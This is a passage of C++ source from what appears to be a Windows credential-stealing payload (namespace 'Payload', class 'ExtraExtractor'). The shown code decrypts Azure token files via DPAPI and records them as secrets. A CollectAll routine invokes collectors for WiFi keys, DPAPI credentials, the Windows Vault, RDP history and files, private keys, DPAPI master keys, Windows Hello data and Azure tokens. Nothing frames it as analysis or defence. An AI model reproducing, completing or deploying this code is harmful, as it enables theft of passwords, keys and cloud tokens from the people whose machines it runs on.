                std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)), {});
                std::string decrypted = DPAPIDecrypt(blob);
                if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty()) {
                    AddSecret("AzureToken", file.path().string(), blob, "");
                    anyFound = true;
                }
            }
        }
        if (!anyFound) {
            m_pipe.Log("NO_AZURE_TOKENS");
        }
    }

    // -------------------------------------------------------------------------
    // CollectAll – calls all collection methods
    // -------------------------------------------------------------------------
    void ExtraExtractor::CollectAll() {
        CollectWiFi();
        CollectDPAPICredentials();
        CollectVault();
        CollectRAS();
        CollectPrivateKeys();
        CollectLegacyApps();
        CollectRDPHistory();
        CollectRDPFiles();
        CollectOutgoingRDP();
        CollectUserMasterKeys();
        CollectMachineMasterKeys();
        CollectWindowsHello();
        CollectAzureTokens();
    }

} // namespace Payload